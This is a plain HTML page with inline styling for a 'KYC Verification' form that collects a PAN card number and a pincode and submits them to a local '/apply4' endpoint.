<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KYC Verification</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f5f5f5;
            color: #333;
            line-height: 1.6;
        }

        .container {
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }

        h2 {
            text-align: center;
            color: #2c3e50;
            margin-bottom: 20px;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        label {
            font-weight: bold;
            margin-bottom: 5px;
            color: #34495e;
        }

        input[type="text"], input[type="number"] {
            margin-bottom: 15px;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        button {
            padding: 10px;
            background-color: #2980b9;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }

        button:hover {
            background-color: #3498db;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>KYC Verification</h2>
        <form id="kyc-verification-form" action="/apply4" method="POST">
            <label for="pan-card-number">PAN Card Number:</label>
            <input type="text" id="pancardnumber" name="pancardnumber" required pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" title="Enter a valid PAN Card Number (e.g., ABCDE1234F)">
            
            <label for="pincode">Pincode:</label>
            <input type="number" id="pincode" name="pincode" required pattern="[0-9]{6}" title="Enter a valid 6-digit pincode">
            
            <button type="submit">Proceed</button>
        </form>
    </div>
</body>
</html>
